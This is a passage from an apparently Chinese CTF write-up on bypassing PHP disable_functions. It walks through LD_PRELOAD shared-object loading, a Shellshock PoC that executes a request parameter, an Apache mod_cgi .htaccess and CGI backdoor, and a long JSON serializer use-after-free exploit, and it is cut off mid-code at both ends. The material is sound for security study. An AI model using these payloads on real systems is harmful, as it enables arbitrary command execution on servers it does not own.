hack.so<br></code></pre></td></tr></table></figure><p>同时编辑恶意php文件 用于加载恶意so文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>putenv(<span class="hljs-string">&quot;LD_PRELOAD=/tmp/hack.so&quot;</span>);<br><span class="hljs-comment">//mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);  mail这题被ban</span><br>error_log(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//1.php</span><br></code></pre></td></tr></table></figure><p>上传 hack.so &#x3D;&gt; &#x2F;tmp&#x2F;   1.php &#x3D;&gt; &#x2F;var&#x2F;www&#x2F;html&#x2F; </p><p>使用 </p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?a</span>nt=<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;1.php&#x27;</span>); 或者 直接访问<span class="hljs-number">1</span>.php 触发<br></code></pre></td></tr></table></figure><p>然而这题并不能这样解出答案</p><h3 id="Pro"><a href="#Pro" class="headerlink" title="Pro"></a>Pro</h3><p>此解法无需受害机安装sendmail</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br>__attribute__ ((__constructor__)) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">angel</span> <span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    system(<span class="hljs-string">&quot;/readflag &gt; /tmp/1.txt&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>触发方法 和上面一样 不过运行1.php之后还需上传一次 hack.so</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204141211259.png" alt="image-20220414121108100"></p><p>之后就可以得到flag了</p><p>参考链接：</p><p><a href="https://ego00.blog.csdn.net/article/details/109078117">feng</a></p><p><a href="https://xz.aliyun.com/t/10057#toc-6">bypass disable_functions姿势总结</a></p><p><a href="https://www.freebuf.com/web/192052.html">无需sendmail：巧用LD_PRELOAD突破disable_functions</a></p><h2 id="Bash-Shellshock-CVE-2014-6271-破壳漏洞"><a href="#Bash-Shellshock-CVE-2014-6271-破壳漏洞" class="headerlink" title="Bash Shellshock(CVE-2014-6271)破壳漏洞"></a>Bash Shellshock(CVE-2014-6271)破壳漏洞</h2><p>版本限制：php &lt; 5.6.2 &amp; bash &lt;&#x3D; 4.3（破壳） 其他条件</p><ul><li><code>putenv</code></li><li><code>mail</code> or <code>error_log</code> 本例中禁用了 <code>mail</code> 但未禁用 <code>error_log</code></li><li><code>/bin/bash</code> 存在 <code>CVE-2014-6271</code> 漏洞</li><li><code>/bin/sh -&gt; /bin/bash</code> <strong>sh 默认的 shell 是 bash</strong></li></ul><p>​    Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p><p>简单测试是否存在破壳漏洞:<br>命令行输入<code>env x=&#39;() &#123; :;&#125;; echo vulnerable&#39; bash -c &quot;echo this is a test&quot;</code><br>如果输出了<code>vulnerable</code>，则说明存在bash破壳漏洞</p><p>贴上一个poc  <a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/2">Antsword的解析</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">runcmd</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span>&#123;<br>  <span class="hljs-variable">$d</span> = dirname(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_FILENAME&quot;</span>]);<br>  <span class="hljs-keyword">if</span>(substr(<span class="hljs-variable">$d</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) == <span class="hljs-string">&quot;/&quot;</span> &amp;&amp; function_exists(<span class="hljs-string">&#x27;putenv&#x27;</span>) &amp;&amp; (function_exists(<span class="hljs-string">&#x27;error_log&#x27;</span>) || function_exists(<span class="hljs-string">&#x27;mail&#x27;</span>)))&#123;<br>    <span class="hljs-keyword">if</span>(strstr(readlink(<span class="hljs-string">&quot;/bin/sh&quot;</span>), <span class="hljs-string">&quot;bash&quot;</span>)!=<span class="hljs-literal">FALSE</span>)&#123;<br>      <span class="hljs-variable">$tmp</span>=tempnam(sys_get_temp_dir(), <span class="hljs-string">&#x27;as&#x27;</span>);<br>      putenv(<span class="hljs-string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="hljs-subst">$c</span> &gt;<span class="hljs-subst">$tmp</span> 2&gt;&amp;1&quot;</span>);<br>      <span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">&#x27;error_log&#x27;</span>)) &#123;<br>        error_log(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">1</span>);<br>      &#125;<span class="hljs-keyword">else</span>&#123;<br>        mail(<span class="hljs-string">&quot;a@127.0.0.1&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;-bv&quot;</span>);<br>      &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Not vuln (not bash)\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$output</span> = @file_get_contents(<span class="hljs-variable">$tmp</span>);<br>    @unlink(<span class="hljs-variable">$tmp</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$output</span>!=<span class="hljs-string">&quot;&quot;</span>)&#123;<br>      <span class="hljs-keyword">print</span>(<span class="hljs-variable">$output</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;No output, or not vuln.&quot;</span>);<br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;不满足使用条件&quot;</span>);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// runcmd(&quot;whoami&quot;); // 要执行的命令</span><br>runcmd(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-comment">// ?cmd=whoami</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>putenv(<span class="hljs-string">&quot;PHP_hack=() &#123; :; &#125;; tac /flag &gt; /var/www/html/hack.php&quot;</span>);<br>error_log(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h2 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h2><p>利用条件:</p><ul><li>Apache + PHP (apache 使用 apache_mod_php)</li><li>Apache 开启了 cgi, rewrite</li><li>Web 目录给了 AllowOverride 权限</li></ul><p>关于 <strong>CGI</strong> 和 <strong>Mod CGI</strong></p><p>CGI - 负责实现服务器和web服务器的通信。</p><p>Mod CGI - 任何具有MIME类型application&#x2F;x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。</p><p>上传<code>.htaccess</code>文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Options</span> +ExecCGI<br>AddHandler cgi-script .<span class="hljs-keyword">ant</span><br></code></pre></td></tr></table></figure><p>随后上传 <code>shell.ant</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">echo</span> Content-type: text/html<br><span class="hljs-built_in">echo</span>&amp;&amp;<span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;/var/www/html/backdoor&quot;</span>;tac /flag;<br></code></pre></td></tr></table></figure><p>修改shell.net 权限 <code>0777</code> 之后访问 <code>url/backdoor/shell.ant</code>  然而这都是理想情况</p><p>不知道为啥 ctfhub 连shell都执行不了…. 更连接不上…不行还是插件吧 无语</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204142133909.png" alt="image-20220414213348786"></p><p>啥也没动 初始环境…</p><h2 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h2><p>FPM - FPM是管理FastCGI进程的,能够解析fastcgi协议。</p><p>直接脚本梭哈了</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204142210978.png" alt="image-20220414221008902"></p><p>之后会发现 web目录下 多出了一个文件</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204142210336.png" alt="image-20220414221028254"></p><p>新建一个数据 加上刚刚那个文件</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204142211747.png" alt="image-20220414221149692"></p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/5598">浅析php-fpm的攻击方式</a></p><h2 id="GC-UAF"><a href="#GC-UAF" class="headerlink" title="GC UAF"></a>GC UAF</h2><p>版本限制</p><ul><li>7.0 - all versions to date</li><li>7.1 - all versions to date</li><li>7.2 - all versions to date</li><li>7.3 - all versions to date</li></ul><p>通过PHP垃圾收集器中堆溢出来绕过 disable_functions 并执行系统命令。</p><p>还是插件一把梭</p><h2 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a>Json Serializer UAF</h2><p>版本限制</p><ul><li>7.1 - all versions to date</li><li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li><li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li></ul><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;/readflag&quot;</span>;<br><br><span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <span class="hljs-comment"># increase this value if you get segfaults</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MySplFixedArray</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SplFixedArray</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$leak</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Z</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">JsonSerializable</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>      <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = chr(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= chr(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-comment"># unable to leak ro segments</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak1</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$spl1</span>;<br><br>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-number">8</span>, <span class="hljs-variable">$addr</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-keyword">return</span> strlen(get_class(<span class="hljs-variable">$spl1</span>));<br>    &#125;<br><br>    <span class="hljs-comment"># the real deal</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak2</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$spl1</span>, <span class="hljs-variable">$fake_tbl_off</span>;<br><br>        <span class="hljs-comment"># fake reference zval</span><br>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-variable">$fake_tbl_off</span> + <span class="hljs-number">0x10</span>, <span class="hljs-number">0xdeadbeef</span>); <span class="hljs-comment"># gc_refcounted</span><br>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-variable">$fake_tbl_off</span> + <span class="hljs-number">0x18</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>); <span class="hljs-comment"># zval</span><br>        <span class="hljs-keyword">$this</span>-&gt;write(<span class="hljs-keyword">$this</span>-&gt;abc, <span class="hljs-variable">$fake_tbl_off</span> + <span class="hljs-number">0x20</span>, <span class="hljs-number">6</span>); <span class="hljs-comment"># type (string)</span><br><br>        <span class="hljs-variable">$leak</span> = strlen(<span class="hljs-variable">$spl1</span>::<span class="hljs-variable">$leak</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_Write</span><br>                <span class="hljs-comment"># handle pie</span><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_exec</span><br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;constant&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-keyword">$this</span>-&gt;leak2(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> 